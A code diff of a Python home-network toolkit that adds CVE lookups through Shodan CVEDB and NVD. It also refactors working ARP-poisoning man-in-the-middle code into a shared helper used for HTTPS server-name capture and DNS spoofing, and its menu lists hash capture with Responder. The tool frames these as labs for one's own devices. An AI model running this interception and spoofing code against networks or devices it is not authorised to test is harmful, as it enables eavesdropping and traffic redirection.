@@ -13,6 +13,7 @@ Some steps work best in an admin/root shell (packet capture, OS scan).
 """
 
 import concurrent.futures as cf
+import contextlib
 import json
 import os
 import platform
@@ -443,6 +444,42 @@ def iot_probe(ip, open_ports):
     return out
 
 
+def _nvd_request(url):
+    """Build an NVD API request with our UA and the optional NVD_API_KEY header."""
+    import urllib.request
+    req = urllib.request.Request(url, headers={"User-Agent": "lan-toolkit"})
+    key = os.environ.get("NVD_API_KEY")
+    if key:
+        req.add_header("apiKey", key)
+    return req
+
+
+def _nvd_severity(cve):
+    """Pull a severity/score string out of an NVD CVE's metrics (v3.1/3.0/2)."""
+    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
+        m = cve.get("metrics", {}).get(k)
+        if m:
+            d = m[0].get("cvssData", {})
+            return d.get("baseSeverity") or str(d.get("baseScore", "?"))
+    return "?"
+
+
+def _shodan_cvedb(param, value, max_results):
+    """Query Shodan CVEDB (free, no key) by product= or cpe23=. Returns a list of
+    formatted CVE lines, or [] on miss/error."""
+    import urllib.request, urllib.parse, json
+    try:
+        u = "https://cvedb.shodan.io/cves?%s=%s&limit=%d" % (
+            param, urllib.parse.quote(value), max_results)
+        d = json.load(urllib.request.urlopen(
+            urllib.request.Request(u, headers={"User-Agent": "lan-toolkit"}), timeout=15))
+        cves = d.get("cves", [])[:max_results]
+        tag = f"  (product={value})" if param == "product" else ""
+        return [f"  {c.get('cve_id', '?')}  cvss={c.get('cvss', '?')}{tag}" for c in cves]
+    except Exception:
+        return []
+
+
 def vuln_lookup(query, max_results=3):
     """[2] Look up CVEs for a service banner. Order of preference:
        1. searchsploit (offline, version-aware) if installed
@@ -470,39 +507,61 @@ def vuln_lookup(query, max_results=3):
     product = (m.group(0) if m else q.split()[0]).lower().strip("._-")
 
     # 2. Shodan CVEDB (no key, reliable)
-    try:
-        u = "https://cvedb.shodan.io/cves?product=%s&limit=%d" % (urllib.parse.quote(product), max_results)
-        d = json.load(urllib.request.urlopen(
-            urllib.request.Request(u, headers={"User-Agent": "lan-toolkit"}), timeout=12))
-        cves = d.get("cves", [])[:max_results]
-        if cves:
-            return [f"  {c.get('cve_id', '?')}  cvss={c.get('cvss', '?')}  (product={product})"
-                    for c in cves]
-    except Exception:
-        pass
+    hits = _shodan_cvedb("product", product, max_results)
+    if hits:
+        return hits
 
     # 3. NVD keyword fallback (flaky without a key)
     url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=%d&keywordSearch=%s"
            % (max_results, urllib.parse.quote(q)))
-    req = urllib.request.Request(url, headers={"User-Agent": "lan-toolkit"})
-    key = os.environ.get("NVD_API_KEY")
-    if key:
-        req.add_header("apiKey", key)
     try:
-        data = json.load(urllib.request.urlopen(req, timeout=12))
+        data = json.load(urllib.request.urlopen(_nvd_request(url), timeout=12))
     except Exception as e:
         return [f"  (CVE lookup unavailable: {e}; product={product})"]
     res = []
     for item in data.get("vulnerabilities", [])[:max_results]:
         cve = item.get("cve", {})
-        sev = "?"
-        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
-            mm = cve.get("metrics", {}).get(k)
-            if mm:
-                sev = mm[0].get("cvssData", {}).get("baseSeverity") or str(mm[0].get("cvssData", {}).get("baseScore", "?"))
-                break
-        res.append(f"  {cve.get('id', '?')}  severity={sev}")
+        res.append(f"  {cve.get('id', '?')}  severity={_nvd_severity(cve)}")
     return res or ["  (no CVEs matched this banner)"]
+
+
+def nvd_cpe_search(keyword, limit=10):
+    """Find official CPE names for a product in NVD's CPE dictionary.
+    Returns (list_of_cpe_names, error_or_None)."""
+    import urllib.request, urllib.parse, json
+    u = ("https://services.nvd.nist.gov/rest/json/cpes/2.0?resultsPerPage=%d&keywordSearch=%s"
+         % (limit, urllib.parse.quote(keyword)))
+    req = _nvd_request(u)
+    last = None
+    for attempt in range(3):          # NVD is 503-flaky without a key
+        try:
+            d = json.load(urllib.request.urlopen(req, timeout=15))
+            return [p["cpe"]["cpeName"] for p in d.get("products", [])], None
+        except Exception as e:
+            last = e
+            if attempt < 2:
+                time.sleep(6)
+    return [], f"{last} (NVD flaky without a key — set NVD_API_KEY)"
+
+
+def vuln_lookup_cpe(cpe, max_results=8):
+    """Version-exact CVE lookup by CPE 2.3 string. Shodan CVEDB (no key) first,
+    then NVD cpeName. Returns list of strings."""
+    import urllib.request, urllib.parse, json
+    hits = _shodan_cvedb("cpe23", cpe, max_results)
+    if hits:
+        return hits
+    u = ("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=%d&cpeName=%s"
+         % (max_results, urllib.parse.quote(cpe)))
+    try:
+        d = json.load(urllib.request.urlopen(_nvd_request(u), timeout=15))
+    except Exception as e:
+        return [f"  (CVE-by-CPE lookup failed: {e})"]
+    res = []
+    for item in d.get("vulnerabilities", [])[:max_results]:
+        cve = item.get("cve", {})
+        res.append(f"  {cve.get('id', '?')}  severity={_nvd_severity(cve)}")
+    return res or ["  (no CVEs for that CPE)"]
 
 
 def step_portscan(net):
@@ -582,6 +641,29 @@ def step_portscan(net):
 # ----------------------------------------------------------------------
 # STEP 3 - Read traffic
 # ----------------------------------------------------------------------
+def _dns_capture(tshark, iface, duration):
+    """Capture outbound DNS queries for `duration`s and return a deduped list of
+    (source_ip, domain), with .local names tagged (mDNS). Shared by the traffic
+    step and the auto report."""
+    cap = subprocess.run(
+        [tshark, "-i", iface, "-a", f"duration:{duration}", "-n",
+         "-Y", "dns.flags.response==0", "-T", "fields",
+         "-e", "ip.src", "-e", "dns.qry.name"],
+        capture_output=True, text=True).stdout
+    seen = []
+    for line in cap.splitlines():
+        parts = line.split("\t")
+        if len(parts) != 2 or not parts[0] or not parts[1]:
+            continue
+        src = parts[0]
+        dom = parts[1].split(",")[0]          # first name if several
+        if dom.endswith(".local"):
+            dom += "  (mDNS)"                  # local service discovery
+        if (src, dom) not in seen:
+            seen.append((src, dom))
+    return seen
+
+
 def step_traffic(net):
     print("\n[Step 3] Reading traffic")
     print("""You see THIS machine's unicast traffic, PLUS everyone's multicast/
@@ -644,28 +726,35 @@ payloads are encrypted - you see WHICH hosts, not the contents.
             print(f"  {b/1024:8.1f}  {peer:<16}{label}")
         return
 
+    # [11] connections / SNI (live stream; TLS ClientHello carries SNI in clear)
     if sub == "b":
-        # TLS ClientHello carries the destination server name (SNI) in clear text
         print(f"\nCapturing HTTPS connections for 15s on interface {iface} ...")
         print("(browse something on this PC to see more)\n")
         print(f"{'DEST IP':<17}{'PORT':<6}SERVER")
         print("-" * 55)
         fields = ["-e", "ip.dst", "-e", "tcp.dstport",
                   "-e", "tls.handshake.extensions_server_name"]
-        disp = "tls.handshake.type==1"
-    else:
-        print(f"\nCapturing DNS queries for 15s on interface {iface} ...")
-        print("(browse something on this PC to see more)\n")
-        print(f"{'SOURCE':<16}DOMAIN")
-        print("-" * 50)
-        fields = ["-e", "ip.src", "-e", "dns.qry.name"]
-        disp = "dns.flags.response==0"
+        try:
+            subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
+                            "-Y", "tls.handshake.type==1", "-T", "fields"] + fields)
+        except Exception as e:
+            print(f"Capture failed ({e}). Npcap may need an admin shell.")
+        return
 
+    # [10] DNS capture (deduped summary - same engine as --auto's report)
+    print(f"\nCapturing DNS queries for 15s on interface {iface} ...")
+    print("(browse something on this PC to see more)\n")
+    print(f"{'SOURCE':<16}DOMAIN")
+    print("-" * 50)
     try:
-        subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
-                        "-Y", disp, "-T", "fields"] + fields)
+        seen = _dns_capture(tshark, iface, 15)
     except Exception as e:
-        print(f"Capture failed ({e}). Npcap may need an admin shell.")
+        print(f"Capture failed ({e}). Npcap may need an admin shell."); return
+    if seen:
+        for src, dom in seen:
+            print(f"  {src:<16}{dom}")
+    else:
+        print("  (no DNS lookups in this 15s window - try while browsing)")
 
 
 # ----------------------------------------------------------------------
@@ -759,6 +848,23 @@ def _upnp_mappings():
     return results
 
 
+def _remote_host_snapshot():
+    """This PC's remote-access posture: (ssh_present, rdp_enabled). rdp_enabled is
+    None on non-Windows or if the registry read fails. Shared by the remote-access
+    step and the auto report."""
+    ssh = shutil.which("ssh") is not None
+    rdp = None
+    if IS_WIN:
+        try:
+            import winreg
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                               r"System\CurrentControlSet\Control\Terminal Server")
+            rdp = winreg.QueryValueEx(k, "fDenyTSConnections")[0] == 0
+        except OSError:
+            rdp = None
+    return ssh, rdp
+
+
 def step_remote(net):
     print("\n[Step 4] Remote access to your own devices")
     print(f"""  SSH out:        ssh user@<ip>
@@ -766,18 +872,12 @@ def step_remote(net):
   Router admin:   http://{net['gateway']}
 """)
 
+    ssh, rdp = _remote_host_snapshot()
     print("This machine's remote-access tools:")
-    print(f"  SSH client: {'yes' if shutil.which('ssh') else 'no'}")
-    if IS_WIN:
-        try:
-            import winreg
-            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                               r"System\CurrentControlSet\Control\Terminal Server")
-            deny = winreg.QueryValueEx(k, "fDenyTSConnections")[0]
-            print(f"  RDP host (incoming): {'enabled' if deny == 0 else 'disabled'}"
-                  "  (note: Windows Home cannot host RDP)")
-        except OSError:
-            pass
+    print(f"  SSH client: {'yes' if ssh else 'no'}")
+    if rdp is not None:
+        print(f"  RDP host (incoming): {'enabled' if rdp else 'disabled'}"
+              "  (note: Windows Home cannot host RDP)")
 
     print("\nThis machine's listening services:")
     listening = _listening_ports()
@@ -1060,6 +1160,105 @@ def _report_capture(seen, target, fname):
         pass
 
 
+@contextlib.contextmanager
+def arp_mitm(net, target, verbose=False):
+    """ARP-poison `target` <-> gateway for the duration of the with-block, then
+    restore. Shared by the ARP intercept lab and DNS spoofing.
+
+    Yields (t_mac, g_mac) on success, or (None, err_message) on failure - the
+    caller should print err_message and bail. Enables IP forwarding on entry and,
+    on exit, re-advertises the REAL MACs (15x, small gaps) BEFORE disabling
+    forwarding, so a device that cached the poisoned entry re-learns the truth and
+    never black-holes. With verbose=True it narrates each step (for the standalone
+    ARP lab); callers that print their own status leave it False."""
+    from scapy.all import ARP, Ether, srp, sendp, conf
+    gw = net["gateway"]
+    try:
+        conf.iface = conf.route.route(target)[0]     # the iface that reaches the LAN
+    except Exception:
+        pass
+
+    def mac_of(ip):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                     timeout=2, retry=2, verbose=0)
+        return ans[0][1].hwsrc if ans else None
+
+    if verbose:
+        print("\nResolving MAC addresses ...")
+    try:
+        t_mac, g_mac = mac_of(target), mac_of(gw)
+    except Exception as e:
+        yield (None, f"Packet access failed: {e}\n"
+                     "Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated.")
+        return
+    if not t_mac or not g_mac:
+        yield (None, f"Could not resolve MACs (target={t_mac}, gateway={g_mac}).\n"
+                     "Make sure the device is awake and on this network.")
+        return
+    if verbose:
+        print(f"  target  {target:<15} = {t_mac}")
+        print(f"  gateway {gw:<15} = {g_mac}")
+
+    alias = _fwd_alias()
+    if verbose:
+        print(f"\nEnabling IP forwarding on '{alias}' (keeps {target} online)...")
+    _set_forwarding(alias, "Enabled")
+
+    stop = threading.Event()
+
+    def poison():
+        # tell target WE are the gateway, and tell gateway WE are the target
+        pkt_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
+        pkt_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
+        while not stop.is_set():
+            sendp(pkt_t, verbose=0)
+            sendp(pkt_g, verbose=0)
+            stop.wait(2)
+
+    th = threading.Thread(target=poison, daemon=True)
+    th.start()
+    try:
+        yield (t_mac, g_mac)
+    finally:
+        if verbose:
+            print("\nStopping spoof and RESTORING the network ...")
+        stop.set()
+        th.join(timeout=3)
+        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
+        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
+        for _ in range(15):
+            sendp(fix_t, verbose=0)
+            sendp(fix_g, verbose=0)
+            time.sleep(0.2)
+        _set_forwarding(alias, "Disabled")   # remove forwarding only after re-learning
+        if verbose:
+            print("  ARP tables restored, IP forwarding disabled. Done.")
+
+
+def _capture_sni(target, ipver, outfile):
+    """Run a 20s tshark capture of `target`'s :443 flows (ipver 4 or 6) and report
+    the server names (SNI), or the owner of the destination IP when SNI is hidden.
+    Shared by the ARP and NDP intercept labs. Returns the 'seen' list."""
+    tshark = find_tshark()
+    iface = wifi_interface(tshark) if tshark else None
+    if not (tshark and iface):
+        print("  tshark/Wi-Fi interface not found - cannot show SNI.")
+        return []
+    src, dst = ("ip.src", "ip.dst") if ipver == 4 else ("ipv6.src", "ipv6.dst")
+    # Capture ALL :443 traffic from the target (not just handshakes) so ALREADY-OPEN
+    # connections show up too - their data packets still reveal the destination IP,
+    # which we resolve via ip_org().
+    cap = subprocess.run(
+        [tshark, "-i", iface, "-a", "duration:20", "-n",
+         "-Y", f"{src}=={target} && (tcp.port==443 || udp.port==443)",
+         "-T", "fields", "-e", dst,
+         "-e", "tls.handshake.extensions_server_name"],
+        capture_output=True, text=True).stdout
+    seen = _flows_to_seen(cap, target)
+    _report_capture(seen, target, outfile)   # name if handshake seen, else IP->org
+    return seen
+
+
 def step_arp(net, target=None):
     print("\n[Intercept: ARP / IPv4]  (YOUR OWN devices only)")
     print("""Spoofs ONE device so its traffic flows through this PC, then shows
@@ -1079,85 +1278,18 @@ and your own devices. Everything is restored when it stops.""")
         print("  Refusing to target this PC or the router."); return
 
     try:
-        from scapy.all import ARP, Ether, srp, sendp, conf
+        import scapy.all as _s  # noqa: F401  (clear message if scapy is missing)
     except ImportError:
         print("  Needs scapy:  pip install scapy"); return
 
-    gw = net["gateway"]
-    try:
-        conf.iface = conf.route.route(target)[0]     # use the iface that reaches the LAN
-    except Exception:
-        pass
-
-    def mac_of(ip):
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-                     timeout=2, retry=2, verbose=0)
-        return ans[0][1].hwsrc if ans else None
-
-    print("\nResolving MAC addresses ...")
-    try:
-        t_mac, g_mac = mac_of(target), mac_of(gw)
-    except Exception as e:
-        print(f"  Packet access failed: {e}")
-        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
-    if not t_mac or not g_mac:
-        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac}).")
-        print("  Make sure the device is awake and on this network."); return
-    print(f"  target  {target:<15} = {t_mac}")
-    print(f"  gateway {gw:<15} = {g_mac}")
-
-    alias = _fwd_alias()
-    print(f"\nEnabling IP forwarding on '{alias}' (keeps {target} online)...")
-    _set_forwarding(alias, "Enabled")
-
-    stop = threading.Event()
-
-    def poison():
-        # tell target WE are the gateway, and tell gateway WE are the target
-        pkt_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
-        pkt_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
-        while not stop.is_set():
-            sendp(pkt_t, verbose=0)
-            sendp(pkt_g, verbose=0)
-            stop.wait(2)
-
-    th = threading.Thread(target=poison, daemon=True)
-    th.start()
-    print("Spoofing active. Capturing the target's HTTPS server names for 20s...")
-    print("(make sure the device is doing something - e.g. a video playing)\n")
-
-    tshark = find_tshark()
-    iface = wifi_interface(tshark) if tshark else None
-    try:
-        if not (tshark and iface):
-            print("  tshark/Wi-Fi interface not found - cannot show SNI.")
+    with arp_mitm(net, target, verbose=True) as (t_mac, g_mac):
+        if t_mac is None:
+            for ln in g_mac.split("\n"):      # g_mac holds the error message
+                print(f"  {ln}")
             return
-        # Capture ALL 443 traffic from the target (not just handshakes), so
-        # ALREADY-OPEN connections show up too - their data packets still
-        # reveal the destination IP, which we resolve via ip_org().
-        cap = subprocess.run(
-            [tshark, "-i", iface, "-a", "duration:20", "-n",
-             "-Y", f"ip.src=={target} && (tcp.port==443 || udp.port==443)",
-             "-T", "fields", "-e", "ip.dst",
-             "-e", "tls.handshake.extensions_server_name"],
-            capture_output=True, text=True).stdout
-        seen = _flows_to_seen(cap, target)
-        _report_capture(seen, target, "arp-sni.txt")   # name if handshake seen, else IP->org
-    finally:
-        print("\nStopping spoof and RESTORING the network ...")
-        stop.set()
-        th.join(timeout=3)
-        # Send the CORRECT mappings back to both sides, many times with small
-        # gaps, so a device that cached the poisoned entry is sure to re-learn
-        # the real MAC BEFORE we remove forwarding (otherwise it black-holes).
-        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
-        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
-        for _ in range(15):
-            sendp(fix_t, verbose=0)
-            sendp(fix_g, verbose=0)
-            time.sleep(0.2)
-        _set_forwarding(alias, "Disabled")   # remove forwarding only after re-learning
-        print("  ARP tables restored, IP forwarding disabled. Done.")
+        print("Spoofing active. Capturing the target's HTTPS server names for 20s...")
+        print("(make sure the device is doing something - e.g. a video playing)\n")
+        _capture_sni(target, 4, "arp-sni.txt")
 
 
 # ----------------------------------------------------------------------
@@ -1252,20 +1384,8 @@ through this PC. Only on your own network/devices. Restored on exit.""")
     th.start()
     print("Spoofing active. Capturing the target's IPv6 HTTPS server names for 20s...\n")
 
-    tshark = find_tshark()
-    iface = wifi_interface(tshark) if tshark else None
-    seen = []
     try:
-        if not (tshark and iface):
-            print("  tshark/Wi-Fi interface not found - cannot show SNI."); return
-        cap = subprocess.run(
-            [tshark, "-i", iface, "-a", "duration:20", "-n",
-             "-Y", f"ipv6.src=={target} && (tcp.port==443 || udp.port==443)",
-             "-T", "fields", "-e", "ipv6.dst",
-             "-e", "tls.handshake.extensions_server_name"],
-            capture_output=True, text=True).stdout
-        seen = _flows_to_seen(cap, target)
-        _report_capture(seen, target, "ndp-sni.txt")   # name if handshake seen, else IP->org
+        _capture_sni(target, 6, "ndp-sni.txt")
     finally:
         print("\nStopping spoof and RESTORING the network ...")
         stop.set()
@@ -1343,33 +1463,10 @@ def step_dnsspoof(net, target=None, domain=None, redirect=None):
         redirect = input(f"Redirect it to which IP [{net['ip']}]: ").strip() or net["ip"]
 
     try:
-        from scapy.all import (ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
-                               srp, sendp, sniff, conf)
+        from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, sniff
     except ImportError:
         print("  Needs scapy: pip install scapy"); return
 
-    gw = net["gateway"]
-
-    def mac_of(ip):
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-                     timeout=2, retry=2, verbose=0)
-        return ans[0][1].hwsrc if ans else None
-
-    t_mac, g_mac = mac_of(target), mac_of(gw)
-    if not t_mac or not g_mac:
-        print("  Could not resolve MACs."); return
-    alias = _fwd_alias()
-    _set_forwarding(alias, "Enabled")
-    stop = threading.Event()
-
-    def poison():
-        pt = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
-        pg = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
-        while not stop.is_set():
-            sendp(pt, verbose=0); sendp(pg, verbose=0); stop.wait(2)
-
-    th = threading.Thread(target=poison, daemon=True); th.start()
-    print(f"\nSpoofing {domain} -> {redirect} for {target} (30s, Ctrl+C to stop)...")
     stats = {"seen": 0, "spoofed": 0}
 
     def handle(pkt):
@@ -1385,30 +1482,30 @@ def step_dnsspoof(net, target=None, domain=None, redirect=None):
                 stats["spoofed"] += 1
                 print(f"  spoofed {pkt[DNSQR].qname.decode(errors='replace')} -> {redirect}")
 
-    try:
-        sniff(filter=f"udp port 53 and src host {target}", prn=handle,
-              timeout=30, store=0)
-    except Exception as e:
-        print(f"  sniff failed: {e}")
-    finally:
-        stop.set(); th.join(timeout=3)
-        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
-        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
-        for _ in range(15):
-            sendp(fix_t, verbose=0); sendp(fix_g, verbose=0); time.sleep(0.2)
-        _set_forwarding(alias, "Disabled")
+    # arp_mitm handles MAC resolution, forwarding, and ARP restore on exit.
+    with arp_mitm(net, target) as (t_mac, g_mac):
+        if t_mac is None:
+            for ln in g_mac.split("\n"):      # g_mac holds the error message
+                print(f"  {ln}")
+            return
+        print(f"\nSpoofing {domain} -> {redirect} for {target} (30s, Ctrl+C to stop)...")
+        try:
+            sniff(filter=f"udp port 53 and src host {target}", prn=handle,
+                  timeout=30, store=0)
+        except Exception as e:
+            print(f"  sniff failed: {e}")
         msg = (f"plaintext DNS queries seen from {target}: {stats['seen']}  |  "
                f"spoofed: {stats['spoofed']}")
         print(f"  {msg}")
         if stats["seen"] == 0:
             print("  (0 plaintext queries = target is using encrypted DNS (DoT/DoH))")
-        print("  Restored ARP + forwarding. Done.")
         try:
             with open(os.path.join(HOME, "Downloads", "dnsspoof.txt"), "w",
                       encoding="utf-8") as f:
                 f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {domain} -> {redirect}\n{msg}\n")
         except OSError:
             pass
+    print("  Restored ARP + forwarding. Done.")
 
 
 # ----------------------------------------------------------------------
@@ -1581,6 +1678,36 @@ def step_responder(net):
 
 
 # ----------------------------------------------------------------------
+# STEP 9 - CVE LOOKUP (precise, by CPE)
+# ----------------------------------------------------------------------
+def step_cvelookup(net):
+    print("\n[Step 9] CVE LOOKUP - precise, version-exact by CPE")
+    kw = input("Product to search (e.g. 'openssh 8.2', 'dasannetworks h660'): ").strip()
+    if not kw:
+        return
+    print("Searching NVD's CPE dictionary ...")
+    cpes, err = nvd_cpe_search(kw)
+    if err:
+        print(f"  CPE search failed: {err}"); return
+    if not cpes:
+        print("  No CPE in NVD for that product (common for consumer/ISP routers).")
+        print("  Falling back to coarse keyword lookup:")
+        for ln in vuln_lookup(kw):
+            print(ln)
+        return
+    print("\n  Matching CPEs (pick an 'o:...firmware' or 'a:...' entry - those carry CVEs):")
+    for i, c in enumerate(cpes, 1):
+        print(f"   {i}) {c}")
+    sel = input("Number (blank to cancel): ").strip()
+    if not sel.isdigit() or not (1 <= int(sel) <= len(cpes)):
+        print("  Cancelled."); return
+    cpe = cpes[int(sel) - 1]
+    print(f"\n  Version-exact CVEs for {cpe}:")
+    for ln in vuln_lookup_cpe(cpe):
+        print(ln)
+
+
+# ----------------------------------------------------------------------
 # JSON baseline helpers (used by the auto report)
 # ----------------------------------------------------------------------
 def _load_json(path):
@@ -1611,6 +1738,7 @@ MENU = """
   6) DNS spoof - redirect a domain  (your own devices only)
   7) Credential test - default/weak creds  (your own devices only)
   8) Responder - capture Windows auth hashes  (your own network only)
+  9) CVE lookup - precise, by CPE (version-exact)
   q) Quit
 """
 
@@ -1661,22 +1789,7 @@ def auto_report(net):
         print("  No Wi-Fi capture interface found - skipping.")
     else:
         try:
-            cap = subprocess.run(
-                [tshark, "-i", iface, "-a", "duration:10", "-n",
-                 "-Y", "dns.flags.response==0", "-T", "fields",
-                 "-e", "ip.src", "-e", "dns.qry.name"],
-                capture_output=True, text=True).stdout
-            seen = []
-            for line in cap.splitlines():
-                parts = line.split("\t")
-                if len(parts) != 2 or not parts[0] or not parts[1]:
-                    continue
-                src = parts[0]
-                dom = parts[1].split(",")[0]          # first name if several
-                if dom.endswith(".local"):
-                    dom += "  (mDNS)"                  # local service discovery
-                if (src, dom) not in seen:
-                    seen.append((src, dom))
+            seen = _dns_capture(tshark, iface, 10)
             if seen:
                 for src, dom in seen:
                     print(f"  {src:<16}-> {dom}")
@@ -1687,18 +1800,11 @@ def auto_report(net):
 
     # --- [4] Remote access snapshot ---
     section("[4] REMOTE ACCESS  (this PC)")
-    print(f"  SSH client : {'yes' if shutil.which('ssh') else 'no'}")
-    if IS_WIN:
-        try:
-            import winreg
-            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                               r"System\CurrentControlSet\Control\Terminal Server")
-            deny = winreg.QueryValueEx(k, "fDenyTSConnections")[0]
-            note = "" if deny else "  "
-            print(f"  RDP host   : {'enabled' if deny == 0 else 'disabled'}"
-                  f"  (Windows Home cannot host RDP)")
-        except OSError:
-            pass
+    ssh, rdp = _remote_host_snapshot()
+    print(f"  SSH client : {'yes' if ssh else 'no'}")
+    if rdp is not None:
+        print(f"  RDP host   : {'enabled' if rdp else 'disabled'}"
+              f"  (Windows Home cannot host RDP)")
     listening = _listening_ports()
     print(f"  Listening  : {', '.join(listening) if listening else 'none (pure client)'}")
     print(f"  Router UI  : http://{net['gateway']}")
@@ -1736,6 +1842,7 @@ def run_menu(net):
         "1": step_discover, "2": step_portscan, "3": step_traffic,
         "4": step_remote, "5": step_intercept,
         "6": step_dnsspoof, "7": step_credtest, "8": step_responder,
+        "9": step_cvelookup,
     }
     while True:
         try:
@@ -1751,7 +1858,7 @@ def run_menu(net):
                     print(f"Error: {e}")
                 input("\n[Enter] to return to the menu ...")   # keep results on screen
             else:
-                print("Pick 1-8 or q.")
+                print("Pick 1-9 or q.")
         except KeyboardInterrupt:
             print("\nInterrupted - back to menu. (q to quit)")
 
